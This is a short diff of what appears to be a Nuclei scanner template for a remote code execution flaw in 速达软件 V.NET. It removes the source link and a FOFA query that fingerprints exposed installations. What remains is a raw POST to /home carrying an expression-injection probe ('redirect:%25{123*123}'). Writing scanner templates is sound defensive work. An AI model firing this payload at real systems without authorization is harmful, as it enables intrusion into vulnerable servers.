@@ -3,20 +3,14 @@ info:
   name: 速达软件 V.NET home RCE
   author: hacktwo
   severity: high
-  description: '来源: 语雀漏洞知识库 https://www.yuque.com/hacktwo/dtdx2v/yq5b08nsgzrp8pbg'
+  description: ''
   tags: rce,2024
-  metadata:
-    source: yuque-hacktwo-dtdx2v
-    doc-slug: yq5b08nsgzrp8pbg
-    fofa: body="速达软件技术（广州）有限公司"||app="速达软件-公司产品"
 http:
 - raw:
   - 'POST /home HTTP/1.1
 
 
     Content-type: application/x-www-form-urlencoded
-
-
 
 
     redirect:%25{123*123}
